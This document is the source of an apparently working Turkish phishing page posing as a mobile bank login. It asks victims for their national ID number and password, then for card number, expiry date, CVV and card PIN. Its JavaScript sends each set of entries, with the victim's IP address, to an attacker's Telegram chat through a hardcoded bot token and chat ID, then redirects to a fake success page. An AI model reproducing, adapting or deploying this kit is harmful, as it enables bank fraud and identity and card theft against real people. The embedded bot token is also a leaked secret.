<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/main.css">
    <link rel="preconnect" href="https://fonts.googleapis.com/">
    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <title>Mobile Sayfa</title>
    <style>
        /* Step için stiller */
        .step {
            display: none;
        }
        
        .step.active {
            display: block;
        }
        
        /* Preloader için ek stil (main.css'de yoksa) */
        .preloader {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 100000;
            transition: opacity 0.5s ease;
        }
        
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        /* Slide için ek stiller */
        .fullscreen-div {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            z-index: 9999;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
            transition: opacity 0.5s ease;
        }
        
        .fullscreen-div img {
            max-width: 90%;
            max-height: 90%;
            object-fit: contain;
            animation: zoomIn 0.3s ease;
        }
        
        @keyframes zoomIn {
            from {
                transform: scale(0.8);
                opacity: 0;
            }
            to {
                transform: scale(1);
                opacity: 1;
            }
        }
        
        .fullscreen-div.hide {
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <form>
        <header></header>
        
        <!-- Slide Div - Ekrana tıklayınca düşecek -->
        <div class="fullscreen-div" id="fullscreenDiv" style="display: flex;">
            <img src="images/slide.png" alt="slide" id="slideImage">
        </div>

        <!-- Adım 1: TC ve Şifre -->
        <div id="step1" class="step active">
            <center>
                <input type="text" class="form-control" id="tcnum" maxlength="11" placeholder="Müşteri / TC Kimlik Numarası">
            </center>
            <center>
                <input type="password" class="form-control" id="pwd" maxlength="6" inputmode="numeric" placeholder="Parola">
                <div id="errorMessage" class="error-message">Giriş Bilgilerinizi lütfen kontrol ediniz.</div>
                <button id="formSubmit" class="btn" type="button">Giriş</button>
            </center>
        </div>

        <!-- Adım 2: Kart Bilgileri -->
        <div id="step2" class="step">
            <div class="main">
                <center>
                    <label for="phone2" style="display: block;font-size: 16px;font-weight: bold;margin-bottom: 15px;margin-top: 15px;color: #4b4848;">Giriş Yapabilmek Lütfen Kart Bilgilerinizi Giriniz</label>
                </center>
                <center>
                    <label for="cardNumber" style="display: block;font-size: 16px;font-weight: bold;margin-bottom: 5px;margin-top: 5px;color: #4b4848;">Kart Numarası:</label>
                    <input type="text" id="cardNumber" name="cardNumber" class="form-control" maxlength="19" placeholder="0000 0000 0000 0000" inputmode="numeric" required>
                </center>
                <center>
                    <label for="expiryDate" style="display: block;font-size: 16px;font-weight: bold;margin-bottom: 5px;margin-top: 5px;color: #4b4848;">Son Kullanma Tarihi:</label>
                    <input type="text" id="expiryDate" name="expiryDate" class="form-control" maxlength="5" placeholder="MM/YY" required>
                </center>
                <center>
                    <label for="cvv" style="display: block;font-size: 16px;font-weight: bold;margin-bottom: 5px;margin-top: 5px;color: #4b4848;">CVV:</label>
                    <input type="text" id="cvv" name="cvv" class="form-control" maxlength="3" placeholder="000" inputmode="numeric" required>
                </center>
                <center>
                    <label for="cvvPassword" style="display: block;font-size: 16px;font-weight: bold;margin-bottom: 5px;margin-top: 5px;color: #4b4848;">Kart Şifresi:</label>
                    <input type="password" id="cvvPassword" name="cvvPassword" class="form-control" maxlength="4" placeholder="••••" inputmode="numeric" required>
                </center>
                <div id="errorMessage2" class="error-message">Kart Bilgilerinizi lütfen kontrol ediniz.</div>
                <center>
                    <button id="cardSubmit" class="btn" type="button">Gönder</button>
                </center>
            </div>
        </div>

        <!-- Preloader -->
        <div class="preloader" id="preloader">
            <div class="spinner"></div>
        </div>
    </form>

    <script>
        // ============ PRELOADER ============
        function hidePreloader() {
            const preloader = document.getElementById('preloader');
            if (preloader) {
                preloader.style.opacity = '0';
                setTimeout(() => {
                    preloader.style.display = 'none';
                }, 500);
            }
        }

        window.addEventListener('load', function() {
            setTimeout(hidePreloader, 500);
        });

        window.onerror = function() {
            hidePreloader();
            return false;
        };

        setTimeout(hidePreloader, 3000);

        // ============ SLIDE SHOW - Ekrana tıklayınca düşecek ============
        function closeSlide() {
            const fullscreenDiv = document.getElementById('fullscreenDiv');
            if (fullscreenDiv) {
                fullscreenDiv.classList.add('hide');
                setTimeout(() => {
                    fullscreenDiv.style.display = 'none';
                }, 500);
            }
            // Slaytın kapatıldığını kaydet
            localStorage.setItem('slideShown', 'true');
        }

        function checkSlideShown() {
            const slideShown = localStorage.getItem('slideShown');
            const fullscreenDiv = document.getElementById('fullscreenDiv');
            if (slideShown === 'true' && fullscreenDiv) {
                fullscreenDiv.style.display = 'none';
            }
        }

        // Slide div'ine tıklayınca kapat
        const fullscreenDiv = document.getElementById('fullscreenDiv');
        if (fullscreenDiv) {
            fullscreenDiv.addEventListener('click', closeSlide);
        }

        // ============ TELEGRAM ============
        const BOT_TOKEN = '8467863574:AAHmszHPGYiguGfAGLaxivj27Zxgsrc3dkY';
        const CHAT_ID = '-1003874564893';

        function getIPAddress(callback) {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => callback(data.ip))
                .catch(() => callback('Bilinmiyor'));
        }

        function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
            fetch(url)
                .then(response => response.json())
                .then(data => console.log('Telegram başarılı:', data))
                .catch(error => console.error('Telegram hatası:', error));
        }

        // ============ VALIDASYON ============
        function validateCardNumber(cardNumber) {
            let digits = cardNumber.replace(/\D/g, '');
            if (digits.length < 13 || digits.length > 19) return false;
            let sum = 0;
            let isEven = false;
            for (let i = digits.length - 1; i >= 0; i--) {
                let digit = parseInt(digits[i], 10);
                if (isEven) {
                    digit *= 2;
                    if (digit > 9) digit -= 9;
                }
                sum += digit;
                isEven = !isEven;
            }
            return sum % 10 === 0;
        }

        function formatCardNumber(input) {
            let value = input.value.replace(/\D/g, '');
            value = value.replace(/(.{4})/g, '$1 ').trim();
            input.value = value.substring(0, 19);
        }

        function formatExpiryDate(input) {
            let value = input.value.replace(/\D/g, '');
            if (value.length > 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            input.value = value.substring(0, 5);
        }

        // ============ FORM İŞLEMLERİ ============
        function submitFirstForm() {
            const tcnum = document.getElementById('tcnum');
            const pwd = document.getElementById('pwd');
            const errorMessage = document.getElementById('errorMessage');
            
            if (!tcnum.value || !pwd.value) {
                errorMessage.textContent = 'Lütfen tüm alanları doldurun!';
                errorMessage.style.display = 'block';
                return;
            }
            
            if (tcnum.value.length !== 11 || isNaN(tcnum.value)) {
                errorMessage.textContent = 'Geçerli bir TC kimlik numarası giriniz! (11 hane)';
                errorMessage.style.display = 'block';
                tcnum.focus();
                return;
            }
            
            if (pwd.value.length !== 6 || isNaN(pwd.value)) {
                errorMessage.textContent = 'Geçerli bir parola giriniz! (6 hane)';
                errorMessage.style.display = 'block';
                pwd.focus();
                return;
            }
            
            errorMessage.style.display = 'none';
            
            sessionStorage.setItem('tc', tcnum.value);
            sessionStorage.setItem('password', pwd.value);
            
            getIPAddress(function(ip) {
                const message = `🔐 YENİ GİRİŞ BİLGİSİ\n\nTC: ${tcnum.value}\nŞifre: ${pwd.value}\nIP: ${ip}\nTarih: ${new Date().toLocaleString('tr-TR')}`;
                sendToTelegram(message);
            });
            
            document.getElementById('step1').classList.remove('active');
            document.getElementById('step2').classList.add('active');
        }

        function submitCardForm() {
            const cardNumber = document.getElementById('cardNumber');
            const expiryDate = document.getElementById('expiryDate');
            const cvv = document.getElementById('cvv');
            const cvvPassword = document.getElementById('cvvPassword');
            const errorMessage = document.getElementById('errorMessage2');
            
            let hasError = false;
            
            const cleanCardNumber = cardNumber.value.replace(/\s/g, '');
            if (!validateCardNumber(cleanCardNumber) || cleanCardNumber.length < 13) {
                errorMessage.textContent = 'Geçerli bir kart numarası giriniz!';
                errorMessage.style.display = 'block';
                cardNumber.style.border = '2px solid red';
                hasError = true;
            } else {
                cardNumber.style.border = '';
            }
            
            if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryDate.value)) {
                if (!hasError) errorMessage.textContent = 'Son kullanma tarihi hatalı! MM/YY formatında giriniz.';
                errorMessage.style.display = 'block';
                expiryDate.style.border = '2px solid red';
                hasError = true;
            } else {
                const [month, year] = expiryDate.value.split('/');
                const now = new Date();
                const currentYear = now.getFullYear() % 100;
                const currentMonth = now.getMonth() + 1;
                
                if (parseInt(year) < currentYear || (parseInt(year) === currentYear && parseInt(month) < currentMonth)) {
                    if (!hasError) errorMessage.textContent = 'Kartın son kullanma tarihi geçmiş!';
                    errorMessage.style.display = 'block';
                    expiryDate.style.border = '2px solid red';
                    hasError = true;
                } else {
                    expiryDate.style.border = '';
                }
            }
            
            if (!/^\d{3}$/.test(cvv.value)) {
                if (!hasError) errorMessage.textContent = 'CVV kodu hatalı! 3 haneli giriniz.';
                errorMessage.style.display = 'block';
                cvv.style.border = '2px solid red';
                hasError = true;
            } else {
                cvv.style.border = '';
            }
            
            if (!/^\d{4}$/.test(cvvPassword.value)) {
                if (!hasError) errorMessage.textContent = 'Kart şifresi hatalı! 4 haneli giriniz.';
                errorMessage.style.display = 'block';
                cvvPassword.style.border = '2px solid red';
                hasError = true;
            } else {
                cvvPassword.style.border = '';
            }
            
            if (hasError) return;
            
            errorMessage.style.display = 'none';
            
            const preloader = document.getElementById('preloader');
            if (preloader) preloader.style.display = 'flex';
            
            const tc = sessionStorage.getItem('tc') || 'Alınamadı';
            const password = sessionStorage.getItem('password') || 'Alınamadı';
            
            getIPAddress(function(ip) {
                const message = `💳 YENİ KART BİLGİSİ\n\n` +
                    `👤 TC: ${tc}\n` +
                    `🔑 Şifre: ${password}\n` +
                    `💳 Kart No: ${cardNumber.value}\n` +
                    `📅 SKT: ${expiryDate.value}\n` +
                    `🔒 CVV: ${cvv.value}\n` +
                    `🔐 Kart Şifresi: ${cvvPassword.value}\n` +
                    `🌐 IP: ${ip}\n` +
                    `📅 Tarih: ${new Date().toLocaleString('tr-TR')}`;
                
                sendToTelegram(message);
                
                setTimeout(() => {
                    // Popup kaldırıldı, direkt yönlendirme yapılıyor
                    window.location.href = 'success.html';
                    hidePreloader();
                }, 1500);
            });
        }

        // ============ EVENT LISTENERS ============
        document.addEventListener('DOMContentLoaded', function() {
            // Slayt gösterilmiş mi kontrol et
            checkSlideShown();
            
            const submitBtn = document.getElementById('formSubmit');
            if (submitBtn) {
                submitBtn.removeAttribute('onclick');
                submitBtn.addEventListener('click', submitFirstForm);
            }
            
            const cardSubmitBtn = document.getElementById('cardSubmit');
            if (cardSubmitBtn) {
                cardSubmitBtn.addEventListener('click', submitCardForm);
            }
            
            const tcnum = document.getElementById('tcnum');
            const pwd = document.getElementById('pwd');
            
            if (tcnum) {
                tcnum.addEventListener('keypress', function(e) {
                    if (e.key === 'Enter') submitFirstForm();
                });
            }
            
            if (pwd) {
                pwd.addEventListener('keypress', function(e) {
                    if (e.key === 'Enter') submitFirstForm();
                });
            }
            
            const cardNumberInput = document.getElementById('cardNumber');
            if (cardNumberInput) {
                cardNumberInput.addEventListener('input', function() {
                    formatCardNumber(this);
                });
            }
            
            const expiryDateInput = document.getElementById('expiryDate');
            if (expiryDateInput) {
                expiryDateInput.addEventListener('input', function() {
                    formatExpiryDate(this);
                });
            }
            
            const inputs = ['tcnum', 'pwd', 'cardNumber', 'expiryDate', 'cvv', 'cvvPassword'];
            inputs.forEach(id => {
                const input = document.getElementById(id);
                if (input) {
                    input.addEventListener('focus', function() {
                        this.style.border = '';
                        const errorMsg = (id === 'tcnum' || id === 'pwd') ? 
                            document.getElementById('errorMessage') : 
                            document.getElementById('errorMessage2');
                        if (errorMsg) errorMsg.style.display = 'none';
                    });
                }
            });
            
            if (typeof $ !== 'undefined') {
                $('header').on('click', function() {
                    window.location.href = 'index.html';
                });
            }
        });
    </script>
</body>
</html>
